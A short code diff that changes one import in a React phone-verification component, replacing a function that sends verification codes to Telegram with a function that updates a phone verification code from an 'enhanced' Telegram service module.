@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { useLocation, useNavigate } from "react-router-dom";
-import { sendVerificationCodeToTelegram } from "@/lib/telegram-service";
+import { updatePhoneVerificationCode } from "@/lib/telegram-service-enhanced";
 import { ChevronLeft, MessageSquare } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { AlertMessage } from "@/components/AlertMessage";
